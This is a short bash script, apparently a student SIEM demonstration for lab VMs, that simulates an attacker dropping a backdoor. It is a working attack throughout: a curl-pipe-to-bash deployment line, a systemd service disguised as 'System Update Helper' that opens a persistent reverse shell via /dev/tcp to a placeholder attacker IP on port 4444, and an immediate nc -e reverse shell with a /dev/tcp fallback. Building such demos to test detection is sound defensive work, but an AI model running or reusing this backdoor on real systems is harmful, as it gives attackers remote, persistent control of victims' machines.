#!/bin/bash
# FYP SIEM Demo — Educational use on controlled lab VMs only
# Simulates: T1059.004 (pipe-to-shell download) + T1543.002 (systemd persistence)
# Deploy: host this file on the threatactor VM and run via:
#   curl http://<THREATACTOR_IP>:8000/backdoor.sh | bash

ATTACKER_IP="__THREATACTOR_IP__"
ATTACKER_PORT=4444
SERVICE_NAME="siem-update"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# --- Stage 1: T1543.002 — Plant systemd persistence ---
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$SERVICE_NAME" 2>/dev/null

# --- Stage 2: T1059.004 — Immediate reverse shell ---
# Try nc first; fall back to pure-bash /dev/tcp for OpenBSD nc compatibility
nc -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null || \
    bash -i >& /dev/tcp/"$ATTACKER_IP"/"$ATTACKER_PORT" 0>&1
